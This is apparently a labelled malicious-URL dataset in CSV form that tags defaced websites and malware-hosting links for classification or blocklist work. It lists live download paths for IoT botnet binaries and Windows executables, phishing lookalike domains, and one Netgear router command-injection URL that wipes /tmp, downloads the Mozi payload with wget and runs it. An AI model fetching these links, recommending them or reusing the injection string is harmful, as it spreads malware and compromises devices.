url,type
http://www.ekadana.com/nansa-online-store.html?page=shop.browse&category_id=3,defacement
"http://torontochieftains.com/component/option,com_jevents/Itemid,29/day,18/month,02/task,day.listevents/year,2013/index.html",defacement
http://945wg.com/news/index.html?list_39.html,defacement
http://www.yanhua.de/index.php?option=com_content&view=article&id=5&Itemid=6,defacement
http://charleyjohnsonlaw.com/index.php?option=com_content&view=category&layout=blog&id=41&Itemid=164,defacement
http://www.tonyveiculos.com.br/veiculo/1744/chevrolet-celta-ls-2p-2012-flex,defacement
http://www.mnemonicmultimedia.com/billing/announcements.php,defacement
http://notebookreparatur24.com/index.php/agb.html?tmpl=component&print=1&page=,defacement
http://mygerman.info/index.php?option=com_content&view=article&id=72:poveche-ot-440-zhiteli-na-german-s-aktivna-grazhdanska-pozitziya-&catid=38:2009-07-04-13-16-12&Itemid=83,defacement
http://www.dtcbv.nl/index.php?option=com_user&view=login,defacement
http://anvari.co/index.php?format=feed&type=rss&option=com_content&Itemid=68,defacement
http://www.ciblefamillebrandon.com/activites/activites-familiales,defacement
http://www.newtec.ac.uk/courses/short-courses/negotiation-skills-for-managers.html,defacement
http://raizeslivres.com.br/index.html,defacement
http://aciai.com.br/index.php?option=com_content&view=article&id=34&Itemid=40&fontstyle=f-larger,defacement
http://www.forumdetregastel.fr/les-partenaires/44-news-12-tarif-vendredi.html,defacement
http://www.ex-forex.info/index.html?p=222,defacement
http://www.designreisende.de/index.php?option=com_content&view=article&id=115:adamus-inhalt-channelings&catid=63:uebersicht&Itemid=89,defacement
http://www.philharmonia-chor-stuttgart.de/presse/kritiken/43-presse-zu-liszt,defacement
http://www.photoremote.de/de/photonews/196-neue-verlosung-am-01052012,defacement
http://www.norzwebmarketing.com/it/glossario/keyword,defacement
http://mygerman.info/index.php?option=com_phocagallery&view=detail&catid=6:24.05.2010&id=49:p5180060&tmpl=component&phocadownload=1&Itemid=93,defacement
http://columbiafresh.es/index.php?option=com_content&view=article&id=7&Itemid=8,defacement
http://www.allsolarflorida.com/index.php/preferred-vendors/36/98-sliding-glass,defacement
http://pcavto.ru/forum/index.php?app=core&module=search&do=viewNewContent&search_app=forums,defacement
http://www.reing-infor.com.mx/index.php?option=com_content&view=article&id=66:esquema-operativo&catid=35:facetelectconceptos&Itemid=66,defacement
http://rabbikramerslegacy.com/index.html,defacement
http://www.borlangedance.se/index.php?option=com_mailto&tmpl=component&link=aHR0cDovL3d3dy5ib3JsYW5nZWRhbmNlLnNlL2luZGV4LnBocD9vcHRpb249Y29tX2h3ZHBob3Rvc2hhcmUmdGFzaz12aWV3cGhvdG8mcGhvdG9faWQ9MjUmSXRlbWlkPTcy,defacement
http://www.fitasylum.com/index.php/product-reviews/p90x,defacement
http://www.pixelblaze.com.au/<br/>http:/www.pixelblaze.com.au/index.php?option=com_aicontactsafe&view=message&layout=message&pf=1&Itemid=18&tmpl=component,defacement
"http://moustoir-ac.fr/component/option,com_eventlist/format,feed/type,rss/view,eventlist/index.html",defacement
http://viajesyexcursionesengil.com/index.php?option=com_content&view=article&id=16&Itemid=6,defacement
http://www.bbs1wob.de/terminkalender/icalrepeat.detail/2013/01/16/36/-/NGE1NDdkNTExOGE0NDgwYzViZDRjZTE2MjM2NzI0NGI=.html,defacement
http://www.szabadmunkaero.hu/hirek/munkaerpiaci-hirek/62-jotanacs.html,defacement
http://www.manganellipalace.it/en/teatro-greco-romano.html,defacement
http://www.speyerseminar.de/cms/index.php?option=com_content&view=article&id=251&Itemid=386,defacement
http://www.dijon-cereales-meunerie.fr/index.php?option=com_content&view=section&layout=blog&id=6&Itemid=11,defacement
http://www.sementimenzo.it/prodotti/18.html,defacement
http://www.rich.in.ua/star-gallery/sport/35-shakil-onil.html,defacement
http://www.einsteininrastatt.de/index.php/gallery/zuletzt-hinzugekommen,defacement
http://benchmarkms.com/projects/churches/picture/5,defacement
http://www.kulgupuit.ee/index.php?option=com_content&view=article&id=2&Itemid=2&lang=ru,defacement
http://www.demunjones.com/index.php?option=com_mailto&tmpl=component&link=aHR0cDovL3d3dy5kZW11bmpvbmVzLmNvbS9pbmRleC5waHA%2Fb3B0aW9uPWNvbV9jb250ZW50JnZpZXc9YXJ0aWNsZSZpZD0zMzpkZW11bi1qb25lcy10by1yZWxlYXNlLW5ldy1hbGJ1bS1xbGlnaHRxLXNvb24mY2F0aWQ9MTpuZXdzJkl0ZW1pZD0x,defacement
http://centrofierachiuduno.com/index.php?option=com_content&view=article&id=27:pulizia-aree-comuni&catid=8:regolamento&Itemid=12,defacement
http://naadbank.com/index.php?option=com_mailto&tmpl=component&link=261b913820a5bee825ea43aed140405e019d6d16,defacement
http://www.publicidadacr.com/index.php?option=com_content&view=article&id=59&Itemid=176,defacement
http://www.albondon.org/index.php/component/mailto/index.html?tmpl=component&link=aHR0cDovL3d3dy5hbGJvbmRvbi5vcmcvaW5kZXgucGhwL2RvY3VtZW50b3MvMzYtZG9jdW1lbnRvcy84OC1kYXRvcy1kZWwtcGFyby1zZXB0aWVtYnJlLTIwMDktZW4tYWxib25kb24=,defacement
http://achievableventures.com/what-we-do?font-size=larger,defacement
http://leaderinfife.org/index.php?view=article&id=54:useful-documents&tmpl=component&print=1&layout=default&page=&option=com_content&Itemid=61,defacement
http://www.penzkofer-kachelofenbau.de/index.php?option=com_content&view=article&id=53&Itemid=62,defacement
http://www.textilexpres.com/TE/index.php?option=com_content&view=article&id=1653:selvafil-exigentes-en-hilatura&catid=906:empresa&Itemid=65,defacement
http://www.vfleberstadt.de/index.php?limitstart=108,defacement
http://www.austvisiontax.com.au/index.php/financial-planning/84-terms-of-use?tmpl=component&print=1&page=,defacement
http://liegen-sitzen.de/schlafen/bettgestelle/pflegebetten,defacement
http://159.203.2.6/beastmode/b3astmode.arm6,malware
http://download.ningzhidata.com/download/IDG-NINGZHIV1.0-20200310.exe,malware
http://9779.info/%E5%84%BF%E7%AB%A5%E5%9B%BE%E5%BD%A2%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
http://www.mycitystore.in/wp-includes/70187978dca46b3c15d58b15d045a3f0,malware
http://9779.info/%E5%85%AD%E4%B8%80%E5%BF%AB%E4%B9%90%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
http://193.38.51.210/lmaoWTF/loligang.arm5,malware
http://www.wu8188.com/cl/tpl/five-star/ver1/css/five-star.css?v=ver15.32,malware
http://www.3344mt.com/cl/tpl/montecarlo/ver1/css/montecarlo.css?v=ver16.32,malware
safety.microsoft.com.lbmwiyqf.6o3wueyebtcolzb3yzolxfjumg.trade,malware
http://huangjintawujin.cn/examples/jsp/jsp2/jspx/textRotate.html,malware
https://pastebin.com/raw/SCx24umw,malware
https://apbfiber.com/openme/707dd3optoor.exe,malware
http://chinacxyy.com/newscodejs.asp?lm2=195&list=10&icon=0&tj=0&font=10.5&hot=0&new=0&line=24&lmname=0&open=1&n=34&more=0&t=0&week=0&zzly=0&hit=0&pls=0&dot=0&tcolor=CCCCCC,malware
http://170.130.205.117/SBIDIOT/arm7,malware
https://mitsui-jyuku.mixh.jp/uploads/39313687ead846bae3d6dc2187ebf1d00be.exe,malware
http://134.122.95.193/axisbins.sh,malware
http://c9f44961.ngrok.io/virtualtour.exe,malware
http://9779.info/%E8%B1%86%E5%AD%90%E9%BB%8F%E8%B4%B4%E7%94%BB/,malware
http://www.xpj5988.com/skin/css/cn.css;jsessionid=A77C20A90C6790855CB2882AD06183ED,malware
http://9779.info/%E8%A5%BF%E7%93%9C%E5%AD%90%E7%9A%AE%E6%8B%BC%E8%B4%B4%E7%94%BB/,malware
https://mitsui-jyuku.mixh.jp/uploads/449N8Mk0.exe,malware
http://polarr.cc/polarr.exe,malware
http://45.161.255.69:45563/Mozi.m,malware
https://pastebin.com/raw/3qKc1KTf,malware
http://64.227.8.206/lmaoWTF/loligang.mpsl,malware
http://gracegotme.duckdns.org/uLat50vEmCiAzbz.exe,malware
https://mitsui-jyuku.mixh.jp/uploads/2280nH6.exe,malware
http://9779.info/%E5%84%BF%E7%AB%A5%E6%88%BF%E8%B4%B4%E7%94%BB%E6%95%88%E6%9E%9C%E5%9B%BE/,malware
http://linenghb.com/utopia-bedding-flat-sheet-100-cotton-for-maximum-softness-and-easy-care-elegant-double-stitched-tailoring-twin-white/,malware
http://209.97.130.84/Pandoras_Box/pandora.m68k,malware
http://111.43.223.144:33710/Mozi.m,malware
https://drive.google.com/uc?export=download&id=13vZwcD6-HaYTF4J8YjXh3uzqXVR0FkbD,malware
https://onedrive.live.com/download?cid=1164EA2B0783A793&resid=1164EA2B0783A793%21128&authkey=AOoJuE9Aw_IzFkA,malware
https://mitsui-jyuku.mixh.jp/uploads/3941q2w3ez1x2c3.exe,malware
http://162.194.28.60:17442/.i,malware
http://dl.pocolegion.com/n/86885460/onlywinsOMG.exe.exe?secure=1437404418_46a063a1ad46682b84a0c7f0bf4d77c6,malware
http://45.95.168.207/awiotiwhiogoihahogahoi//gucci.arm,malware
http://107.158.154.99/m68k,malware
http://23.254.225.130/x01/ppc,malware
https://onedrive.live.com/download?cid=7A5E689DD1DC641F&resid=7A5E689DD1DC641F!120&authkey=AJj7uEqJvobgFUM,malware
https://mitsui-jyuku.mixh.jp/uploads/1481q2w3ez1x2c3.exe,malware
http://116.114.95.80:57922/Mozi.m,malware
http://222.141.122.62:48340/Mozi.m,malware
https://mitsui-jyuku.mixh.jp/uploads/95513687ead846bae3d6dc2187ebf1d00be.exe,malware
http://176.123.3.26/bins.sh,malware
http://118.37.214.103:26330/.i,malware
http://62.171.190.95/beastmode/b3astmode.ppc,malware
http://chinesevie.com/index.php?option=com_weblinks&view=category&id=63&Itemid=60&lang=en,malware
http://192.236.161.206/bins/blxntz.arm6,malware
http://9779.info/%E8%B1%86%E5%AD%90%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
https://apbfiber.com/openme/716dd3optoor.exe,malware
http://45.14.150.19/mipsel,malware
http://9779.info/%E5%85%AD%E4%B8%80%E5%84%BF%E7%AB%A5%E8%8A%82%E5%B0%8F%E8%B4%B4%E7%94%BB/,malware
http://198.98.61.142/x86,malware
http://115.48.26.192:33456/Mozi.m,malware
http://badmildiou.com/bin/bg_a38a87338bf74e199a44a987e2dcedaf.exe,malware
https://mitsui-jyuku.mixh.jp/uploads/43843fvasea.exe,malware
http://wangqiao365.com/e/wap/show.php?classid=1&id=14&style=0&cpage=0&cid=1&bclassid=0,malware
http://116.114.95.164:40011/Mozi.m,malware
http://42.239.167.82:35997/Mozi.m,malware
http://104.168.173.110/ABCDEFGHIJKLMNOPQRSTUVWXYZ/whoareyou.mpsl,malware
http://42.239.153.147:49349/Mozi.m,malware
https://mitsui-jyuku.mixh.jp/uploads/607ODNO38B.exe,malware
http://157.245.211.242/SBIDIOT/arm6,malware
http://149.28.192.185/SBIDIOT/ppc,malware
http://www.wanjiale518.com.img.800cdn.com/jiaoben18983/images/banner12.jpg,malware
http://9779.info/%E5%B9%BC%E5%84%BF%E5%9B%AD%E8%80%81%E5%B8%88%E8%B4%B4%E7%94%BB%E4%BD%9C%E5%93%81/,malware
https://onedrive.live.com/download?cid=55FF3579FF543F52&resid=55FF3579FF543F52!1825&authkey=AOMq_KOJD8j1mcc,malware
http://9779.info/%E6%A0%91%E5%8F%B6%E8%B4%B4%E7%94%BB%E4%BD%9C%E5%93%81/,malware
http://45.95.168.207/Fuze.sh4,malware
http://www.polska.travel.pl/pogoda-polska/gdansk/pogoda-polska/bydgoszcz/1?miasto=24,malware
https://mitsui-jyuku.mixh.jp/uploads/1984d4fe8115bf6b56a9f2357e2c9e699c5.exe,malware
http://www.jin0044.com/ipl/app/help.php?GameType=5601&lang=zh-cn&HALLID=3820004&State=0,malware
http://fb.com.accounts.login.userid.435908.fbsacc.com/frd/fbn/?next=http%3A%2F%2Fwww.fb.com%2videos%2F%3A%4A%4ID%1A,malware
https://mitsui-jyuku.mixh.jp/uploads/1311q2w3ez1x2c3.exe,malware
http://170.130.205.117/SBIDIOT/m68k,malware
http://5.182.211.241/razor/r4z0r.m68k,malware
http://www.0068555.com/cl/tpl/yh5588/ver3/css/yh5588.css?v=ver31.32,malware
http://www.jtsz.com/zxyey/uploadfile/jpg/2010-10/2010101814518779.jpg,malware
https://toulousa.com/omg/371EYJSFYHMS.exe,malware
http://218.161.83.238:35707/.i,malware
http://9779.info/%E5%85%B3%E4%BA%8E%E5%A4%A9%E6%B0%94%E7%9A%84%E5%89%AA%E8%B4%B4%E7%94%BB/,malware
http://133.167.105.83/jackmyarmv6,malware
http://125.42.233.117:56235/Mozi.m,malware
http://147.75.67.253/bins/enigma.mips,malware
https://pastebin.com/raw/Q6eyM3MF,malware
http://51.178.81.75/ppc,malware
http://37.49.226.204/bins/vcimanagement.x86,malware
http://wxztjz.com/e/public/onclick?enews=donews&classid=47&id=52,malware
http://lovettz.com/starburst-wall-decor-beauty-star/decorative-wall-shelf-kitchen-set/,malware
http://9779.info/%E5%85%AD%E4%B8%80%E5%BF%AB%E4%B9%90%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
http://www.youtube.com/v/ACGjP_YL6d0&color1=0xb1b1b1&color2=0xcfcfcf&hl=en&feature=player_embedded&fs=1,malware
http://185.53.88.182/AB4g5/kiga.arm6,malware
http://9779.info/%E6%AF%9B%E7%BA%BF%E8%B4%B4%E7%94%BB%20%E5%9C%BA%E6%99%AF%E5%9B%BE/,malware
http://88.218.17.215/bins/hoho.x86,malware
http://fb.com.accounts.login.userid.474878.fbsacc.com/frd/fbn/?next=http%3A%2F%2Fwww.fb.com%2videos%2F%3A%4A%4ID%1A,malware
http://111.43.223.194:50812/Mozi.m,malware
http://shy-obi-0122.jellybean.jp/ERC/EIC.exe,malware
http://185.132.53.139/yoyobins.sh,malware
http://www.feinaier.com/img/i1/T1JXaOXq8jXXXXXXXX_%21%210-item_pic.jpg,malware
https://anjelo-directhelp.de/fotos/19397.jpg,malware
https://mitsui-jyuku.mixh.jp/uploads/3290nH6.exe,malware
http://isikpandizot.com/galeri/index.php/tag/8/pandizot+maliyeti,malware
http://9779.info/%E5%B9%BC%E5%84%BF%E5%9B%AD%E7%9A%B1%E7%BA%B9%E7%BA%B8%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
http://9779.info/%E5%88%9B%E6%84%8F%E6%8A%98%E7%BA%B8%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
http://alphauniforms.ae/wetransfers/tuned_OYVJZVG59.bin,malware
https://toulousa.com/omg/277EYJSFYHMS.exe,malware
http://144.202.58.124/SBIDIOT/yarn,malware
https://mitsui-jyuku.mixh.jp/uploads/3111q2w3ez1x2c3.exe,malware
http://www.5068.com/uploads/allimg/130821/81_130821132845_1_lit.jpg,malware
http://161.35.102.253/sh4,malware
http://111.42.103.55:53196/Mozi.m,malware
https://pastebin.com/raw/7jwD3C34,malware
https://toulousa.com/omg/431EYJSFYHMS.exe,malware
http://205.185.114.25/sh4,malware
italianacademyfoundation.org/chopinschumann/ital.bin,malware
http://cltmusic.com/wp-content/themes/gigawatt/scripts/ajaxupload.js?ver=3.4.2,malware
http://www.hnedu.cn/web/userfiles/0/11990/Image/20090304/20090304102858140.jpg,malware
http://grasslandhotel.com.vn/index.php/tours/culaochamtours/items/fbtrack.js,malware
http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fzoetekroon.nl%2F2013%2F10%2Fdolfijnentaart%2F&layout=button_count&show_faces=true&width=450&action=like&font=tahoma&colorscheme=light,malware
https://mitsui-jyuku.mixh.jp/uploads/52743fvasea.exe,malware
https://download-serverupdate.eu-gb.cf.appdomain.cloud/,malware
http://77.43.188.218:54461/Mozi.m,malware
http://www.triciaduffy.com.au/wp-includes/images/wlw/Docs/Doc,malware
https://mitsui-jyuku.mixh.jp/uploads/20213687ead846bae3d6dc2187ebf1d00be.exe,malware
http://9779.info/%E5%89%AA%E8%B4%B4%E7%94%BB%E7%BA%BF%E6%8F%8F%E4%BD%9C%E5%93%81%E6%AC%A3%E8%B5%8F/,malware
safety.apple.com.rgospl.moq1f2oyljqn2zy.science,malware
http://139.99.236.237/bins/Hilix.ppc,malware
http://193.39.185.214/bins/mpsl,malware
http://218.84.243.7:49046/Mozi.m,malware
http://amos.im.alisoft.com/online.aw?v=2&uid=%E6%9D%B0%E7%89%B9%E8%87%A3%E6%B6%9B&site=cntaobao&s=1&charset=utf-8,malware
http://125.42.233.198:50120/Mozi.m,malware
https://pastebin.com/raw/zb4uyfHe,malware
http://9779.info/%E6%95%99%E5%B8%88%E6%89%8B%E5%B7%A5%E4%BD%9C%E5%93%81%E8%B4%B4%E7%94%BB/,malware
https://savefile.download/,malware
https://drive.google.com/uc?export=download&id=1gnV-z0JyUgGEWadWPtMfkZjXHUlTI3uQ,malware
http://img.sucai.redocn.com/attachments/images/201203/20120315/Redocn_2012031503514702.jpg,malware
http://172.245.52.231/x0ox0ox0oxDefault/z0r0.arm7,malware
https://mitsui-jyuku.mixh.jp/uploads/7513687ead846bae3d6dc2187ebf1d00be.exe,malware
http://37.49.230.128/SBIDIOT/yarn,malware
http://49.82.252.4:58679/Mozi.m,malware
vandiesen.info,malware
http://115.54.65.166:34194/Mozi.m,malware
http://gmmfuelassist.co.uk/sport/468yas27.exe,malware
http://1812.img.pp.sohu.com.cn/images/blog/2012/6/12/11/25/e33774510_138a1259858g213.jpg,malware
https://onedrive.live.com/download?cid=2D6A6389F3FC6C0F&resid=2D6A6389F3FC6C0F!14365&authkey=AGD5hOhB01WJKHM,malware
http://9779.info/%E4%B8%80%E5%B9%B4%E7%BA%A7%E8%B4%B4%E7%94%BB%E5%9B%BE%E7%89%87%E6%AC%A3%E8%B5%8F/,malware
http://industrialtrainingzirakpur.com/web-designing-training-in-zirakpur.html,malware
http://133.167.105.83/jackmyx86,malware
http://162.212.112.199:56410/Mozi.m,malware
http://111.42.102.131:54192/Mozi.m,malware
http://37.49.226.187/arm7,malware
http://9779.info/%E7%81%AB%E6%9F%B4%E5%81%9A%E7%9A%84%E6%8B%BC%E8%B4%B4%E7%94%BB/,malware
http://157.245.127.232/SBIDIOT/m68k,malware
http://9779.info/%E5%B9%BC%E5%84%BF%E5%9B%AD%E8%80%81%E5%B8%88%E8%B4%B4%E7%94%BB%E4%BD%9C%E5%93%81/,malware
http://178.128.146.154/beastmode/b3astmode.arm7,malware
http://206.217.136.142/bins/Hilix.sh4,malware
http://45.95.169.234/SBIDIOT/x86,malware
http://195.144.21.174/SBIDIOT/arm7,malware
http://9779.info/%E5%85%B3%E4%BA%8E%E6%A1%83%E8%8A%B1%E7%9A%84%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
https://pastebin.com/raw/pRzRBWpJ,malware
http://3cf.ru/2015/07/21/ykrainskie-komplektyushie-dlia-voennoi-aviacii-na-knaaze-do-konca-goda-zameniat-rossiiskimi/,malware
https://toulousa.com/omg/350EYJSFYHMS.exe,malware
https://pastebin.com/raw/AFWBj6Di,malware
http://youkuedu.com/index.php/campus-display/57-2013-12-19-11-19-37,malware
http://104.248.53.72/Bleach.ppc,malware
https://apbfiber.com/openme/50612345.exe,malware
https://pastebin.com/raw/JvRyYp9k,malware
http://9779.info/%E5%B9%BC%E5%84%BF%E8%B4%B4%E7%94%BB%E5%9B%BE%E7%89%87%E5%B0%8F%E7%8F%AD/,malware
http://9779.info/%E9%87%91%E9%B1%BC%E5%8F%B6%E8%B4%B4%E7%94%BB%E5%9B%BE%E7%89%87/,malware
http://165.22.21.85/powerpc,malware
http://198.12.97.66/bins/Hilix.mips,malware
http://176.113.161.40:44634/Mozi.m,malware
http://huangjintawujin.cn/examples/jsp/jsp2/tagfiles/products.html,malware
http://23.252.75.251/8080,malware
http://138.68.29.144/bins/kawaii.mips,malware
https://pastebin.com/raw/zS4Mp7Tn,malware
kaelfleming.com,malware
http://grasslandhotel.com.vn/index.php/tours/mysontours/items/fbtrack.js,malware
http://9779.info/%E6%8A%98%E7%BA%B8%E6%89%87%E5%AD%90%E6%8B%BC%E8%B4%B4%E7%94%BB/,malware
http://9779.info/%E7%A2%8E%E5%8D%A1%E7%BA%B8%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
http://192.3.251.44/x86,malware
https://pyxalis.com/wp-content/plugins/os/gg.exe,malware
http://sorgulavtr.net/yukle/30GbKazan.apk,malware
https://mitsui-jyuku.mixh.jp/uploads/903ODNO38B.exe,malware
https://maps.googleapis.com/maps/api/js?sensor=false&callback=initializeMap,malware
http://ybvcgfcsad.ug/zxcvb.exe,malware
http://9779.info/%E6%A0%91%E5%8F%B6%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
https://drive.google.com/uc?export=download&id=1rsnxNCJRrFcFUqYo9Blgbn_a-V2EJW0e,malware
http://211.137.225.77:47533/Mozi.m,malware
http://wxztjz.com/e/public/onclick?enews=donews&classid=65&id=130,malware
http://9779.info/%E5%88%9B%E6%84%8F%E5%87%A0%E4%BD%95%E6%8B%BC%E5%9B%BE%E8%B4%B4%E7%94%BB/,malware
http://125.44.23.144:49467/Mozi.m,malware
http://9779.info/%E5%BA%86%E5%85%83%E6%97%A6%E4%B9%A6%E7%94%BB%E4%BD%9C%E5%93%81/,malware
wieleba.pl,malware
chefsandro.pt,malware
mikeschryver.com,malware
http://9779.info/%E4%B8%80%E5%B9%B4%E7%BA%A7%E5%AD%A6%E7%94%9F%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
https://pastebin.com/raw/ekMzAnyX,malware
http://72.227.229.129:33528/.i,malware
http://123.11.178.85:50120/Mozi.m,malware
http://style.org.hc360.com/css/detail/mysite/siteconfig/pro_control.css,malware
https://apbfiber.com/openme/224dd3optoor.exe,malware
https://toulousa.com/omg/152EYJSFYHMS.exe,malware
http://36.35.161.72:60895/Mozi.m,malware
http://9779.info/%E6%A0%91%E5%8F%B6%E8%B4%B4%E7%94%BB%E4%BD%9C%E5%93%81/,malware
http://www.huiling.org.cn/UpFiles/Picture/admin/products-bjhl/1-heka-huahui/hh-013.jpg,malware
http://9779.info/%E5%84%BF%E7%AB%A5%E6%89%8B%E5%B7%A5%E7%BA%B8%E5%89%AA%E8%B4%B4%E7%94%BB/,malware
http://111.38.25.89:49250/Mozi.m,malware
http://37.49.226.209/bins/dvrbot.mpsl,malware
https://spdtextile.com/sport/12Cl2.exe,malware
http://192.236.146.53:1691/jigoku.arm,malware
http://89.34.27.178/Pemex.sh,malware
http://36.88.55.167:5531/.i,malware
http://211.137.225.39:59636/Mozi.m,malware
http://bjzm365.com/%e0%b8%aa%e0%b8%a7%e0%b8%b1%e0%b8%aa%e0%b8%94%e0%b8%b5%e0%b8%8a%e0%b8%b2%e0%b8%a7%e0%b9%82%e0%b8%a5%e0%b8%81/,malware
http://111.42.66.52:56849/Mozi.m,malware
http://9779.info/%E5%B0%8F%E7%8F%AD%E5%B9%BC%E5%84%BF%E8%8A%B1%E7%93%B6%E6%8B%BC%E8%B4%B4%E7%94%BB/,malware
https://mitsui-jyuku.mixh.jp/uploads/36513687ead846bae3d6dc2187ebf1d00be.exe,malware
http://125.25.89.230:56585/Mozi.m,malware
http://login.2345.com/qq/?forward=http://www.2345.com/?isqqlogin=,malware
https://mitsui-jyuku.mixh.jp/uploads/4154d4fe8115bf6b56a9f2357e2c9e699c5.exe,malware
http://209.141.49.213/bins/lessie.mpsl,malware
http://9779.info/%E5%B9%BC%E5%84%BF%E5%9B%AD%E6%89%8B%E5%B7%A5%E7%B2%98%E8%B4%B4%E7%94%BB%E6%95%99%E6%A1%88/,malware
http://bjpgqsc.com/cp/class/?0.html&page=2&showtj=&showhot=&key=,malware
http://45.148.122.113/i-5.8-6.SNOOPY,malware
beautegrity.dweb.in,malware
http://www.xj9599.com/app/member/indexx.php?path=pages&pages=yh&uid=f554ab9b50d41d8cd98fra3,malware
quebec-lea.com,malware
http://9779.info/%E5%8D%A1%E7%BA%B8%E5%89%AA%E8%B4%B4%E7%94%BB/,malware
http://isikpandizot.com/galeri/index.php/combined/css/ebadbc53dbfa23b70eb15a2eb474f9e3,malware
http://218.21.171.49:58358/Mozi.m,malware
http://videoporn24.ru/skins/01/js/prettyPhoto/css/prettyPhoto.css,malware
progresivne.cz,malware
http://50.3.177.106/SBIDIOT/arm7,malware
http://45.95.169.233/sparc,malware
https://mitsui-jyuku.mixh.jp/uploads/30343fvasea.exe,malware
http://104.248.126.176/danymyx86,malware
http://www.711100.com/app/member/SportOption.php?uid=guest&langx=gb,malware
http://chinesevie.com/index.php?option=com_joomlaquiz&Itemid=151&lang=en,malware
http://111.43.223.121:43468/Mozi.m,malware
http://222.105.26.35:42548/Mozi.m,malware
http://www.pubyun.com/wiki/%E5%B8%AE%E5%8A%A9:%E8%AE%A4%E8%AF%81%E8%AE%BE%E5%A4%87%E6%B8%85%E5%8D%95,malware
https://pastebin.com/raw/3LJ89NAs,malware
http://159.65.160.94/SnOoPy.sh,malware
http://157.245.217.96/SBIDIOT/zte,malware
http://159.65.39.32/x86,malware
https://mitsui-jyuku.mixh.jp/uploads/6894d4fe8115bf6b56a9f2357e2c9e699c5.exe,malware
http://9779.info/%E6%A0%91%E5%8F%B6%E8%B4%B4%E7%94%BB%E4%BD%9C%E5%93%81/,malware
http://58.243.20.165:43481/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1&next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.243.20.165:43481/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,malware
http://178.128.242.198/Pandoras_Box/pandora.mips,malware
http://9779.info/%E7%B2%AE%E9%A3%9F%20%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
http://9779.info/%E7%B2%98%E8%B4%B4%E7%94%BB%E7%9A%B1%E7%BA%B9%E7%BA%B8%E5%9B%A2/,malware
https://mitsui-jyuku.mixh.jp/uploads/3924d4fe8115bf6b56a9f2357e2c9e699c5.exe,malware
http://208.68.39.30/armv6l,malware
https://mitsui-jyuku.mixh.jp/uploads/21843fvasea.exe,malware
https://cdn.discordapp.com/attachments/687683961186549830/697054407749009448/COVID-19.zip,malware
http://adinamed.com/news/index.php?page=6&catid=0&myord=uptime&myshownums=&showtj=&showdate=&author=&key=,malware
http://157.245.178.107/SBIDIOT/x86,malware
https://mitsui-jyuku.mixh.jp/uploads/266ODNO38B.exe,malware
http://www.824555.com/cl/js/jquery-ui-1.8.21.custom.min.js?v=ver17.32,malware
http://211.137.225.150:57299/Mozi.m,malware
https://mitsui-jyuku.mixh.jp/uploads/64513687ead846bae3d6dc2187ebf1d00be.exe,malware
http://39.77.151.155:48300/Mozi.m,malware
http://9779.info/%E5%8D%A1%E7%BA%B8%E6%89%8B%E5%B7%A5%E5%88%B6%E4%BD%9C%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
http://42.229.243.84:39183/Mozi.m,malware
http://9779.info/%E5%B9%BC%E5%84%BF%E4%BD%9C%E5%93%81%E6%A3%89%E8%8A%B1%E8%B4%B4%E7%94%BB/,malware
http://grasslandhotel.com.vn/index.php/tours/danangtours/items/fbtrack.js,malware
http://c9f44961.ngrok.io/built.exe,malware
http://9779.info/%E6%8A%98%E7%BA%B8%E6%89%87%E5%AD%90%E6%8B%BC%E8%B4%B4%E7%94%BB/,malware
http://178.242.54.236:49542/.i,malware
http://9779.info/%E5%84%BF%E7%AB%A5%E8%B1%86%E7%B1%BB%E7%B2%98%E8%B4%B4%E7%94%BB/,malware
